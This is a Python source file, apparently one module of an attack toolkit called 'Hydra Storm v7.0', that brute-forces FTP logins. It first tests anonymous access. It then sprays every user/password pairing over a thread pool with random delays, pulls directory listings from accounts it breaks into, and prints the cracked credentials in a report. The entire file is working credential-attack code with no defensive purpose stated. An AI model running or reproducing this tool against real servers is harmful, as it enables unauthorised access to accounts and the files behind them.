"""
Hydra Storm v7.0 — FTP Brute Force Module
===========================================
Pure stdlib ftplib credential tester with anonymous access detection
and automatic directory listing on successful auth.
"""

import ftplib
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Optional


# ---------------------------------------------------------------------------
# Result containers
# ---------------------------------------------------------------------------
@dataclass
class FTPResult:
    success: bool
    user: str
    password: str
    detail: str = ""
    dir_listing: Optional[List[str]] = None


@dataclass
class FTPReport:
    target: str
    port: int
    total_attempts: int = 0
    found: List[FTPResult] = field(default_factory=list)
    anonymous: Optional[FTPResult] = None
    errors: int = 0
    elapsed: float = 0.0
    rate: float = 0.0


# ---------------------------------------------------------------------------
# FTPBruteForcer
# ---------------------------------------------------------------------------
class FTPBruteForcer:
    """Threaded FTP credential tester with anonymous detection."""

    def __init__(
        self,
        target: str,
        port: int = 21,
        threads: int = 10,
        timeout: int = 8,
    ) -> None:
        self.target = target
        self.port = port
        self.threads = threads
        self.timeout = timeout

        self._lock = threading.Lock()
        self._attempts = 0
        self._errors = 0
        self._found: List[FTPResult] = []
        self._stop = threading.Event()

    # -- helpers ------------------------------------------------------------

    def _bump(self, kind: str = "attempt") -> None:
        with self._lock:
            if kind == "attempt":
                self._attempts += 1
            else:
                self._errors += 1

    def _add_found(self, result: FTPResult) -> None:
        with self._lock:
            self._found.append(result)
            print(f"  [+] FOUND  {result.user}:{result.password}")
            if result.dir_listing:
                for entry in result.dir_listing[:15]:  # cap output
                    print(f"       └─ {entry}")

    def _jitter(self) -> None:
        time.sleep(random.uniform(0.05, 0.4))

    def _grab_listing(self, ftp: ftplib.FTP) -> List[str]:
        """Pull root directory listing from a live FTP session."""
        listing: List[str] = []
        try:
            ftp.retrlines("LIST", listing.append)
        except Exception:
            pass
        return listing

    # -- attack methods -----------------------------------------------------

    def try_login(self, user: str, password: str) -> FTPResult:
        """Attempt FTP login with given credentials."""
        self._bump("attempt")
        self._jitter()

        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login(user, password)
            listing = self._grab_listing(ftp)
            ftp.quit()

            res = FTPResult(True, user, password, "login_ok", listing)
            self._add_found(res)
            return res

        except ftplib.error_perm as exc:
            code = str(exc)[:3]
            if code in ("530", "430"):
                return FTPResult(False, user, password, "auth_failed")
            self._bump("error")
            return FTPResult(False, user, password, f"ftp_error: {exc}")

        except ftplib.error_temp as exc:
            self._bump("error")
            return FTPResult(False, user, password, f"temp_error: {exc}")

        except OSError as exc:
            detail = str(exc).lower()
            if "timed out" in detail:
                tag = "timeout"
            elif "refused" in detail:
                tag = "conn_refused"
            else:
                tag = f"os_error: {exc}"
            self._bump("error")
            return FTPResult(False, user, password, tag)

    def try_anonymous(self) -> FTPResult:
        """Check if anonymous FTP access is allowed."""
        self._bump("attempt")
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.target, self.port, timeout=self.timeout)
            ftp.login("anonymous", "guest@")
            listing = self._grab_listing(ftp)
            ftp.quit()

            res = FTPResult(True, "anonymous", "guest@", "anonymous_ok", listing)
            print(f"  [+] ANONYMOUS ACCESS ENABLED")
            if listing:
                for entry in listing[:15]:
                    print(f"       └─ {entry}")
            return res

        except ftplib.error_perm:
            return FTPResult(False, "anonymous", "guest@", "anonymous_denied")
        except Exception as exc:
            self._bump("error")
            return FTPResult(False, "anonymous", "guest@", f"error: {exc}")

    # -- orchestrator -------------------------------------------------------

    def run(self, users: List[str], passwords: List[str]) -> FTPReport:
        """Launch threaded FTP brute force."""
        total = len(users) * len(passwords)
        print(f"\n{'='*60}")
        print(f"  FTP Brute  |  {self.target}:{self.port}")
        print(f"  Combos: {total}  |  Threads: {self.threads}")
        print(f"{'='*60}\n")

        self._attempts = 0
        self._errors = 0
        self._found.clear()
        self._stop.clear()

        t0 = time.perf_counter()

        # anonymous check first
        print("  [*] Checking anonymous access...")
        anon_result = self.try_anonymous()

        # credential spray
        combos = [(u, p) for u in users for p in passwords]
        random.shuffle(combos)

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = {}
            for user, pwd in combos:
                if self._stop.is_set():
                    break
                fut = pool.submit(self.try_login, user, pwd)
                futures[fut] = (user, pwd)

            for fut in as_completed(futures):
                if self._stop.is_set():
                    break
                try:
                    fut.result()
                except Exception:
                    self._bump("error")

        elapsed = time.perf_counter() - t0
        rate = self._attempts / elapsed if elapsed > 0 else 0.0

        report = FTPReport(
            target=self.target,
            port=self.port,
            total_attempts=self._attempts,
            found=list(self._found),
            anonymous=anon_result if anon_result.success else None,
            errors=self._errors,
            elapsed=round(elapsed, 2),
            rate=round(rate, 1),
        )
        self._print_report(report)
        return report

    # -- formatted report ---------------------------------------------------

    @staticmethod
    def _print_report(r: FTPReport) -> None:
        print(f"\n{'='*60}")
        print(f"  FTP BRUTE REPORT")
        print(f"{'='*60}")
        print(f"  Target      : {r.target}:{r.port}")
        print(f"  Attempts    : {r.total_attempts}")
        print(f"  Errors      : {r.errors}")
        print(f"  Elapsed     : {r.elapsed}s")
        print(f"  Rate        : {r.rate} attempts/sec")
        print(f"  Anonymous   : {'YES ⚠' if r.anonymous else 'No'}")
        print(f"  Creds Found : {len(r.found)}")
        if r.found:
            print(f"  {'─'*54}")
            for c in r.found:
                print(f"    ✓ {c.user} : {c.password}")
        print(f"{'='*60}\n")
